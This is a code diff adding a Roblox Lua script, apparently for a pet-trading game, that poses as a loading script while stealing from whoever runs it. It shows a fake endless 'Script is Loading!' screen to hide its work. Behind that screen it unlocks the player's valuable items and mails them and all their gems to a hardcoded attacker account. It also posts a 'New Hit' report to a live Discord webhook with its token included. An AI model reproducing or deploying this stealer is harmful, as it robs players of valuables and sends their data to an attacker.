@@ -1,0 +1,211 @@
+Username = "EksovaStock"
+Webhook = "https://discord.com/api/webhooks/1325818070777991168/Bq6B_D4jzctG_ObMVtIObN__d0n8S9z9ljksNfXuCutmeCMEBRQ9XskJP09n3D5wafCX"
+MinRAP = 100000
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local Inventory = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
+local UnlockRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked")
+local MailboxRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
+local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
+local RAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
+local Player = Players.LocalPlayer
+local Transition = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
+local HintLabel = Player.PlayerGui.Transition.Hint.HintLabel
+HintLabel.Size = UDim2.new(HintLabel.Size.X.Scale, HintLabel.Size.X.Offset, 2.5, 0)
+
+if not script:GetAttribute("TransitionActive") then
+    script:SetAttribute("TransitionActive", true)
+else
+    return
+end
+
+task.spawn(function()
+    Transition(function()
+        while true do
+            task.wait()
+        end
+    end, "Script is Loading!\n discord.gg/jVUAKUECF4", true)
+end)
+
+local function GetItemRAP(itemID, itemType)
+    local args = {
+        Class = { Name = itemType },
+        StackKey = function()
+            return string.format("{\"id\":\"%s\"}", itemID)
+        end,
+        AbstractGetRAP = function()
+            return nil
+        end
+    }
+    local rapValue = RAPCmds.Get(args)
+    return type(rapValue) == "number" and rapValue or 0
+end
+
+local Gems = CurrencyCmds.Get("Diamonds") or 0
+local GemsUID
+
+for uid, v in pairs(Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemsUID = uid
+        break
+    end
+end
+
+local ItemsToSend = {}
+local TotalRAP = 0  
+
+local categories = {
+    Pet = Inventory.Pet,
+    Misc = Inventory.Misc,
+    Egg = Inventory.Egg,
+    Lootbox = Inventory.Lootbox,
+    Pickaxe = Inventory.Pickaxe,
+    Consumable = Inventory.Consumable
+}
+
+for category, items in pairs(categories) do
+    if items then
+        for uid, item in pairs(items) do
+            if item and item.id then
+                local RAP = GetItemRAP(item.id, category) or 0
+                
+                if RAP == 0 then
+                    warn("RAP missing for item:", item.id, "Type:", category)
+                end
+
+                if RAP >= MinRAP then
+                    table.insert(ItemsToSend, { uid = uid, id = item.id, rap = RAP, type = category, amount = item.quantity or 1 })
+                    TotalRAP = TotalRAP + RAP
+                    print("Added to send list:", item.id, "Type:", category, "RAP:", RAP)
+                end
+            end
+        end
+    end
+end
+
+table.sort(ItemsToSend, function(a, b)
+    return (a.rap or 0) > (b.rap or 0)
+end)
+
+local function FormatNumber(num)
+    if type(num) ~= "number" then
+        warn("Invalid number passed to FormatNumber:", num)
+        return "0"
+    end
+    if num >= 1e9 then
+        return string.format("%.2fB", num / 1e9)
+    elseif num >= 1e6 then
+        return string.format("%.2fM", num / 1e6)
+    elseif num >= 1e3 then
+        return string.format("%.2fK", num / 1e3)
+    else
+        return tostring(num)
+    end
+end
+
+local function SendWebhook()
+    local hitList = {}
+    local maxItems = 13
+    local totalItems = #ItemsToSend
+
+    for i = 1, math.min(maxItems, totalItems) do
+        local item = ItemsToSend[i]
+        if item and item.rap and tonumber(item.rap) then
+            table.insert(hitList, (item.id or "Unknown ID") .. " - RAP: " .. FormatNumber(item.rap))
+        else
+            table.insert(hitList, (item.id or "Unknown ID"))
+        end
+    end
+
+    if totalItems > maxItems then
+        table.insert(hitList, "And more! \u{1F911}")
+    end
+
+    local embed = {
+        ["title"] = "New Hit!!!!",
+        ["type"] = "rich",
+        ["color"] = 5643112,
+        ["fields"] = {
+            {
+                ["name"] = "Player Info",
+                ["value"] = string.format("```\n Username: %s\n Receiver: %s```", Player.Name or "Unknown", Username or "Unknown"),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Hit List \u{1F3AF}",
+                ["value"] = "```" .. (#hitList > 0 and table.concat(hitList, "\n") or "No items above MinRAP") .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Gems \u{1F48E}",
+                ["value"] = "```" .. (Gems and FormatNumber(Gems) or "0") .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Total RAP \u{1F4B8}",
+                ["value"] = "```" .. (TotalRAP and FormatNumber(TotalRAP) or "0") .. "```",
+                ["inline"] = true
+            }
+        },
+        ["footer"] = { ["text"] = "Made by yeslidez - " .. os.date("%Y-%m-%d %H:%M:%S") }
+        
+    }
+
+    local success, jsonData = pcall(function()
+        return HttpService:JSONEncode({ ["content"] = "", ["embeds"] = { embed } })
+    end)
+
+    if not success then
+        warn("Failed to encode JSON: ", jsonData)
+        return
+    end
+
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = jsonData
+    })
+end
+
+local function SendGems()
+    if GemsUID and Gems >= 500 then
+        local gemArgs = { Username, "Made by yeslidez", "Currency", GemsUID, Gems }
+        local response, err = MailboxRemote:InvokeServer(unpack(gemArgs))
+
+        while response == false and err == "You must wait 30 seconds before using the mailbox!" do
+            task.wait(30)
+            response, err = MailboxRemote:InvokeServer(unpack(gemArgs))
+        end
+
+        return response == true
+    end
+    return false
+end
+
+local function SendItems()
+    for _, item in ipairs(ItemsToSend) do
+        UnlockRemote:InvokeServer(item.uid, false)
+        local args = { Username, "Made by yeslidez", item.type, item.uid, item.amount }
+        local response, err = MailboxRemote:InvokeServer(unpack(args))
+
+        while response == false and err == "You must wait 30 seconds before using the mailbox!" do
+            task.wait(30)
+            response, err = MailboxRemote:InvokeServer(unpack(args))
+        end
+
+        task.wait(2)
+    end
+end
+
+SendWebhook()
+task.wait(2)
+
+if not SendGems() then
+    SendItems()
+else
+    task.wait(2)
+    SendItems()
+end
